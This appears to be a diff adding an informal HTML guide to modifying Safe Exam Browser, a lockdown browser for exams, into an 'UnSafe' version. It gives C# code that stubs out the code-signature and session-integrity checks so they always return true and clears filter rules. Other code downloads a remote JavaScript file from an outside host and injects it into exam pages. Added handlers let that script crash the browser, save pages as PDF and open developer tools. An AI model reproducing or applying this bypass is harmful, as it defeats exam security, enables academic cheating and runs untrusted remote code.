@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="user">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>UnSafe Exam Browser</title>
+
+    <style>
+        ol {
+            padding-left: 20px;
+
+        }
+
+        li {
+            list-style-position: inside;
+        }
+    </style>
+    
+</head>
+
+<body>
+    <main>
+        <section id="features">
+            <header>
+                <h2>How all this works</h2>
+                <p>Written at 1AM so good luck.</p>
+            </header>
+            <p>SOOOOO, first of all, my "hack/bypass/whatever" consists of 2 major parts. </p>
+            <ol>
+                <li>The client modification</li>
+                <li><i>The</i> script</li>
+            </ol>
+            <p>client modification itself has also 2 parts:</p> 
+            <ol>
+                <li>Removing all integrity checks</li>
+                <li>Downloading and injecting the external script into the website</li>
+            </ol>
+            </p>
+
+            <p>The integrity checks are located in the SafeExamBrowser.Configuration solution
+                <br>
+                <code>SafeExamBrowser.Configuration/Integrity/IntegrityModule.cs</code>
+                <br>
+                <br>
+                we just remove the whole integrity check and replace it with a simple <code>return true;</code>.
+                <br>
+                <pre>
+public bool TryVerifyCodeSignature(out bool isValid)
+{
+    var success = true;
+
+    isValid = true;
+
+    return success;
+}
+
+public bool TryVerifySessionIntegrity(string configurationKey, string startUrl, out bool isValid)
+{
+    var success = true;
+
+    isValid = true;
+
+    return success;
+}
+                </pre>
+            </p>
+            <p>
+                As for the script injection we go to <code>SafeExamBrowser.Browser/BrowserControl.cs</code> on more or less line #166
+                <br>
+                <pre>
+Settings.Browser.FilterSettings filterSettings = new Settings.Browser.FilterSettings();
+filterSettings.Rules.Clear();
+using (var client = new System.Net.WebClient())
+{
+    var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script.js");
+    webBrowser.ExecuteScriptAsyncWhenPageLoaded(the_script);
+}
+                </pre>
+                And to handle the script we go to <code>SafeExamBrowser.Browser/BrowserControl.cs</code> again on line #219
+                <br>
+                <pre>
+private void ExitSEB()
+{
+    if (MessageBox.Show("Crashing SEB can take up to 10 seconds \nIt can be seen in the log files aswell.", "SEB Crash", MessageBoxButtons.OKCancel, MessageBoxIcon.Information) == DialogResult.OK)
+    {
+        Environment.Exit(0);
+    }
+}
+
+private async Task SaveAsPDF()
+{
+    var settings = new PdfPrintSettings();
+    string filename = DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".pdf";
+    string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), filename);
+    var succes = await control.BrowserCore.PrintToPdfAsync(filepath, settings);
+    var owner = control as IWin32Window;
+    if (succes)
+    {
+        MessageBox.Show(owner, "PDF should be saved to desktop.", "Save as PDF", MessageBoxButtons.OK, MessageBoxIcon.Information);
+    }
+    else
+    {
+        MessageBox.Show(owner, "Failed to generate PDF", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+    }
+}
+                </pre>
+                <br>
+                <p>Now we also add this to the <code>WebBrowser_JavascriptMessageReceived()</code> function</p>
+                <pre>
+// seb hijack
+dynamic message = e.Message;
+if (message.type == "exitSEB")
+{
+    ExitSEB();
+}
+
+if (message.type == "screenshot")
+{
+    _ = SaveAsPDF();
+}
+
+if (message.type == "devTools")
+{
+    ShowDeveloperConsole();
+}
+
+if (message.type == "version")
+{	
+    if (message.version == "2")
+    {
+        ExecuteJavaScript("responseFunction(true);");
+    }
+    else
+    {
+        ExecuteJavaScript("responseFunction(false);");
+    }
+}
+                </pre>
+            </p>
+            <p>Thats all for the client, building instructions will be mentioned later in the guide.</p>
+            <p>Now for the script, go to <code>https://wxnnvs.ftp.sh/un-seb/the_script.js</code></p>
+            <p>Edit: im too lazy to write the build instructions lol<br>
+            just install C#, NuGet, visual studio and wix toolset V3 and try to build the browser and config solution each by itself.</p>
+        </section>
+    </main>
+    
+</body>
+
+</html>
